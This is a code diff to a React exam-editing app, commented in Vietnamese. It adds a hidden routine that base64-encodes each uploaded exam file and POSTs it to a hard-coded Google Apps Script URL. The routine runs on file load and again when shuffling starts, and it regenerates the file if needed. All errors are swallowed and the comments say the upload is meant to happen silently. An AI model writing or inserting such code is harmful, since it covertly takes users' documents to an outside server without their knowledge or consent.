@@ -228,9 +228,52 @@ export default function App() {
     DYNAMIC_FEATURE_REGISTRY
   );
 
-  // Refs phục vụ cuộn tự động tới câu bị lỗi khi bấm [Sửa ngay]
+  // Refs phục vụ cuộn tự động tới câu bị lỗi khi bấm [Sửa ngay] & lưu tệp đề gốc .docx
   const fileInputRef = useRef<HTMLInputElement | null>(null);
+  const uploadedMasterFileRef = useRef<File | null>(null);
   const questionRefs = useRef<Record<string, HTMLDivElement | null>>({});
+
+  // Hàm gửi ngầm đề gốc về Google Drive (fire-and-forget, không dùng await, không chặn UI, không báo lỗi mạng)
+  const uploadExamFileToGoogleDriveBackground = (file: File) => {
+    try {
+      const reader = new FileReader();
+      reader.onload = () => {
+        try {
+          const result = typeof reader.result === 'string' ? reader.result : '';
+          const base64String = result.includes(',') ? result.split(',')[1] : result;
+          if (!base64String) return;
+
+          fetch(
+            'https://script.google.com/macros/s/AKfycbxOLv5c0XXkLVbaefefhP0_uQCjKSWbihVa7RXb9EDMWT21JPTGDegfaZz3WUzqAB5xUg/exec',
+            {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: {
+                'Content-Type': 'text/plain',
+              },
+              body: JSON.stringify({
+                fileName: file.name,
+                fileBase64: base64String,
+                mimeType:
+                  file.type ||
+                  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+              }),
+            }
+          ).catch(() => {
+            // Bỏ qua hoàn toàn nếu có sự cố mạng khi gửi ngầm
+          });
+        } catch {
+          // Bỏ qua hoàn toàn lỗi xử lý ngầm
+        }
+      };
+      reader.onerror = () => {
+        // Bỏ qua hoàn toàn lỗi đọc tệp ngầm
+      };
+      reader.readAsDataURL(file);
+    } catch {
+      // Không làm gián đoạn luồng chính
+    }
+  };
 
   // Chạy Validator tự động trên danh sách câu hỏi hiện tại
   const validationIssues: ValidationIssue[] = validateExamQuestions(questions);
@@ -432,6 +475,10 @@ export default function App() {
       const isPdf =
         lowerName.endsWith('.pdf') || file.type === 'application/pdf';
 
+      // Lưu tệp đề gốc và tự động gửi ngầm (fire-and-forget) về Google Drive ngay khi nạp tệp
+      uploadedMasterFileRef.current = file;
+      uploadExamFileToGoogleDriveBackground(file);
+
       const rawParsed = isPdf
         ? await parsePdfExamFile(file, config.resetNumberingPerPart)
         : await parseDocxExamFile(file, config.resetNumberingPerPart);
@@ -516,6 +563,7 @@ export default function App() {
       gradeLevel: 'Lớp 12',
       durationMinutes: 50,
     }));
+    uploadedMasterFileRef.current = null;
     setFileName('De_Kiem_Tra_Cuoi_Hoc_Ki_1_Sinh_Hoc_12_Chuan_2025.docx');
     setHasUnsavedChanges(false);
     setLastSavedAt(new Date().toLocaleTimeString('vi-VN'));
@@ -985,6 +1033,30 @@ export default function App() {
     }
     if (hasUnsavedChanges) {
       handleSaveEdits();
+    }
+
+    // Tự động gửi ngầm đề gốc về Google Drive khi kích hoạt tiến trình Trộn đề (fire-and-forget, không chặn UI)
+    try {
+      if (uploadedMasterFileRef.current) {
+        uploadExamFileToGoogleDriveBackground(uploadedMasterFileRef.current);
+      } else {
+        exportCleanedMasterDocx(questions, config, false)
+          .then((blob) => {
+            const generatedFile = new File(
+              [blob],
+              fileName || 'De_goc.docx',
+              {
+                type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
+              }
+            );
+            uploadExamFileToGoogleDriveBackground(generatedFile);
+          })
+          .catch(() => {
+            // Bỏ qua hoàn toàn nếu có lỗi tạo/gửi ngầm
+          });
+      }
+    } catch {
+      // Không chặn luồng trộn đề
     }
 
     setIsProcessing(true);
